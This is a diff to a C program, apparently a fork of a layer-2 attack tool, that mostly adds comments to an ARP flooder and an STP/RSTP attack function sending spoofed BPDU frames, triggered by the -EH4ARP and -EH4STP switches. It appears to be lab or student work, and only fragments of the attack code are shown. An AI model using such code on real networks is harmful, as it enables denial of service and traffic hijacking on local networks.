@@ -87,6 +87,7 @@
 #include <net/if.h>
 #include <netpacket/packet.h> // Include this header file for struct sockaddr_ll
 
+//Define Variables to be used later for the RSTP attack
 #define DST_MAC "ff:ff:ff:ff:ff:ff"  // Broadcast MAC address
 #define ETH_TYPE 0x0800             // Ethernet Type (IP)
 #define PKT_SIZE 60                 // Packet size (bytes)
@@ -94,16 +95,9 @@
 
 static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
-
+//Import libraries for the new attacks
 #include <signal.h>
-
 #include <linux/if_ether.h>
-/*
-#include <linux/if_packet.h>
-#define sockaddr_ll2 "linux/if_packet.h"
-#define packet_mreq "linux/if_packet.h"
-#define sockaddr_ll "netpacket/packet.h"
-*/
 
 /*
  * Initial command line arguments parser.
@@ -111,24 +105,41 @@ static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
  * Use global protocol_defs
  */
 
+//initalise break function
  void INThandler(int);
 
+//initalise break function with parameter
  void INThandler(int sig)
  {
+   //This function checks whether the user has hit the keys CTRL + C to abort the ARP flooder
+   //Due to Linux not being able to register break keys with this flooder
+
+   //declare input character
    char  c;
+   //check what signal has been sent from the keyboard
    signal(sig, SIG_IGN);
+   //Ask user for confirmation
    printf("\n Did you hit Ctrl-C?\n"
          "Do you really want to quit? [y/n] ");
+
+   //get input from user
    c = getchar();
+   //check if it is y or Y 
    if (c == 'y' || c == 'Y')
+         //exit program
          exit(0);
    else
+         //goes back to checking if the keys have been pressed again
          signal(SIGINT, INThandler);
-   getchar(); // Get new line character
+   // Get new line character
+   getchar(); 
  }
 
+
+//Arp Flooder Function
 void arpflooder()
 {
+   //Let the user know that the flooder is starting
    printf("Arp Flooder Starting...\n");
    int sock, i;
    char buffer[PKT_SIZE];
@@ -178,8 +189,10 @@ void arpflooder()
    return 0;
 }
 
+//RSTP exploit function
 void exploit(char* interface, unsigned char* evilmac) {
 
+   //create packet
   unsigned char packet[] =  {
     0x01, 0x80, 0xc2, 0x00, 0x00, 0x00,   //multicast addr 
     0x0c, 0x68, 0xce, 0x5e, 0x00, 0x00, //source addr 
@@ -217,7 +230,6 @@ void exploit(char* interface, unsigned char* evilmac) {
         printf("Packet sent", sent);
         //sleep for two seconds to avoid flooding 
         sleep(2);
-        //TODO add system interupt
 
     }
 
@@ -227,9 +239,12 @@ void exploit(char* interface, unsigned char* evilmac) {
 
 void STPAttack()
 {
+   //let the user know that the attack is starting
    printf("STP Attack Starting...\n");
-   unsigned char mac[] = {0x0c, 0x68, 0xce, 0x5e, 0x00, 0x00} ;
-   //0c:68:ce:5e:00:00
+   //char array containing mac address of the host PC
+   unsigned char mac[] = {0x0c, 0x68, 0xce, 0x5e, 0x00, 0x00} ; //This is the hosts PCs mac address
+  
+   //Call function using the port and mac address
    exploit("ens3", mac);
    return 0;
 }
@@ -247,14 +262,16 @@ parser_initial(struct term_tty *tty, struct cl_args *cl_args, int argc, char **a
           break;
        }
        else
-       if (!strcmp(argv[i], "-EH4ARP"))
+       if (!strcmp(argv[i], "-EH4ARP")) //IF the arg is for the arp flooder
        {
+         //call arpflooder function
          arpflooder();
          return -1;
        }
        else
-       if (!strcmp(argv[i], "-EH4STP"))
+       if (!strcmp(argv[i], "-EH4STP")) //IF the arg is for the STP attack
        {
+         //call stpattack
          STPAttack();
          return -1;
        }
